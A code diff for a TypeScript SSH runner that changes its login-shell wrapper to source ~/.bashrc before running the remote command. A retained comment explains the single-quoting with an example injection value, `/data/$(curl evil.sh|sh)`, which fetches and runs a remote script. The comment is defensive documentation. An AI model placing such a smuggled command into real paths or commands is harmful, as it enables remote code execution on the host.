@@ -254,15 +254,19 @@ export class SystemSshRunner implements SshRunner {
     const maxBytes = opts.maxOutputBytes ?? DEFAULT_MAX_OUTPUT_BYTES
     const { loginShell = false } = opts
 
-    // When loginShell is requested wrap the command in `bash -lc '...'` so module / conda PATHs
-    // are loaded. This matches the call_command semantic (design.md §5).
+    // When loginShell is requested wrap the command in `bash -lc '...'` so login profiles run and a
+    // readable ~/.bashrc is attempted before the user command. A non-interactive bash does not read
+    // .bashrc by itself, so source it explicitly. A missing .bashrc is a no-op; a source failure
+    // exits the remote shell and is returned through the normal command result path. A .bashrc may
+    // deliberately return early for non-interactive shells.
     //
     // The wrapper MUST single-quote, not JSON-quote. A double-quoted layer leaves `$(...)`, backticks
     // and `$VAR` live for the OUTER shell, which silently undoes any inner single-quoting a caller did:
     // a spec-supplied cache path like `/data/$(curl evil.sh|sh)` reaches the witness as
     // `test -d '/data/$(...)'`, and the outer double-quoted layer expands it anyway. Single-quoting the
     // whole command makes the outer layer literal, so inner quoting (quoteRemotePath) is load-bearing.
-    const finalCommand = loginShell ? `bash -lc ${shellSingleQuote(remoteCommand)}` : remoteCommand
+    const loginCommand = `if [ -r ~/.bashrc ]; then . ~/.bashrc || exit $?; fi; ${remoteCommand}`
+    const finalCommand = loginShell ? `bash -lc ${shellSingleQuote(loginCommand)}` : remoteCommand
 
     const args = [...target.extraArgs, target.host, finalCommand]
 
